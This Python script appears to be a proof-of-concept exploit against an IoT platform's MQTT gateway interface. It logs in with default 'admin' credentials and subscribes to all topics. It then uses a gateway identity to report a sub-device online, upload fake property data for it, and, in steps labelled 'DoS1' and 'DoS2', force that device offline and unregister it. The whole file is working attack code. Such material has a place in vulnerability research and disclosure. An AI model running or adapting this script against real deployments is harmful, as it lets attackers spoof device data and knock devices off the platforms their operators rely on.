#!/usr/bin/python3
import json
from multiprocessing import Process
import paho.mqtt.client as mqtt
import time
import hashlib

HOST = "127.0.0.1"  # MQTT host
PORT = 1889  # MQTT port
PRODUCT_ID = "1236859833832701953"  # Paste your product_id
DEVICE_ID = "device_a"  # Paste your gateway_id
SUB_DEVICE_ID = "device_b"  # Paste your sub_device_id

secureId = "admin"  # Paste your MQTT secureId
secureKey = "admin"  # Paste your MQTT secureKey


def main_loop(topic, user, password):
    client = mqtt.Client(DEVICE_ID)
    client.username_pw_set(user, password)
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect(HOST, PORT, 60)
    client.subscribe(topic, qos=2)
    client.loop_forever()


def on_connect(client, userdata, flags, rc):
    print("Connected with result code " + str(rc))
    if rc != 0:
        print('Server connection lost')
        return
    print("Connect Success!")

    # Inform cloud that sub-devices are connected to the Gateway
    online_topic = "/" + PRODUCT_ID + "/" + DEVICE_ID + "/child/" + SUB_DEVICE_ID + "/online"
    t = time.time()
    t = str(round(t))
    message_id = '1234567890123456789'
    payload1 = {
        'timestamp': t,
        'messageId': message_id,
        'deviceId': SUB_DEVICE_ID
    }
    client.publish(online_topic, payload=json.dumps(payload1), qos=0, retain=False)

    # Upload fake sub-devices data
    property_topic = "/" + PRODUCT_ID + "/" + DEVICE_ID + "/child/" + SUB_DEVICE_ID + "/properties/report"
    payload2 = {
        'deviceId': SUB_DEVICE_ID,
        'properties': {
            'attribute1': 'value1'
        }
    }
    client.publish(property_topic, payload=json.dumps(payload2), qos=0, retain=False)

    # DoS1
    # sub-device offline
    offline_topic = "/" + PRODUCT_ID + "/" + DEVICE_ID + "/child/" + SUB_DEVICE_ID + "/offline"
    payload3 = {
        'timestamp': t,
        'messageId': message_id
    }
    client.publish(offline_topic, payload=json.dumps(payload3), qos=0, retain=False)

    # DoS2
    # sub-device unregister
    unregister_topic = "/" + PRODUCT_ID + "/" + DEVICE_ID + "/child/" + SUB_DEVICE_ID + "/unregister"
    payload4 = {
        'timestamp': t,
        'messageId': message_id,
        'deviceId': SUB_DEVICE_ID
    }
    client.publish(unregister_topic, payload=json.dumps(payload4), qos=0, retain=False)


def on_message(client, userdata, msg):
    # receive information from the cloud
    print("topic" + ":" + msg.topic + "message:" + msg.payload.decode("utf-8") + "qoc" + ":" + str(msg.qos))


def md5(message):
    m = hashlib.md5()
    m.update(message.encode(encoding='utf-8'))
    return m.hexdigest()


if __name__ == '__main__':
    now = str(round(time.time() * 1000))
    _user = secureId + "|" + now
    # MQTT Password
    _password = md5(_user + "|" + secureKey)
    listenP = Process(target=main_loop, args=("#", _user, _password))
    listenP.start()
